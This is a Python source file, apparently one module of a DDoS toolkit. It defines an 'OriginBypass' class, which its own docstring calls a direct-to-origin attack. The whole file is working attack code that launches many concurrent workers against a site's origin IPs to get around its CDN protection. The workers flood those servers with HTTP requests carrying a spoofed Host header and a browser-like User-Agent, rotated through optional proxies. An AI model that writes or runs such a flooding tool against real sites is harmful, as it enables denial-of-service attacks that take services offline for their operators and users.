import aiohttp
import logging
import random
import asyncio
import time
from typing import List, Optional

class OriginBypass:
    """
    Direct-to-origin attack. Bypasses CDN by connecting directly to the origin IP
    while maintaining the correct Host header.
    """
    def __init__(self, target_domain: str, origin_ips: List[str], proxies: Optional[List[str]] = None):
        self.target_domain = target_domain
        self.origin_ips = origin_ips
        self.proxies = proxies
        self.logger = logging.getLogger("OriginBypass")
        self.total_requests = 0
        self._stop_event = asyncio.Event()

    async def _worker(self, origin_ip: str):
        # We use the origin IP in the URL but set the Host header
        url = f"http://{origin_ip}/" 
        headers = {
            "Host": self.target_domain,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Connection": "keep-alive"
        }
        
        async with aiohttp.ClientSession() as session:
            while not self._stop_event.is_set():
                proxy = random.choice(self.proxies) if self.proxies else None
                try:
                    async with session.get(url, headers=headers, proxy=proxy, timeout=5, allow_redirects=False) as response:
                        self.total_requests += 1
                        if self.total_requests % 100 == 0:
                            self.logger.info(f"[Direct-to-Origin] Requests sent: {self.total_requests}")
                except Exception:
                    pass
                await asyncio.sleep(0.01)

    async def start(self, duration: int, threads_per_ip: int = 20):
        if not self.origin_ips:
            self.logger.error("No origin IPs provided for bypass.")
            return

        self.logger.info(f"[*] Starting Direct-to-Origin bypass on {self.target_domain} via {len(self.origin_ips)} IPs...")
        self.start_time = time.time()
        
        tasks = []
        for ip in self.origin_ips:
            for _ in range(threads_per_ip):
                tasks.append(asyncio.create_task(self._worker(ip)))
        
        try:
            await asyncio.wait_for(self._stop_event.wait(), timeout=duration)
        except asyncio.TimeoutError:
            pass
        finally:
            self._stop_event.set()
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            self.logger.info(f"[+] Origin Bypass finished. Total: {self.total_requests}")

    def stop(self):
        self._stop_event.set()
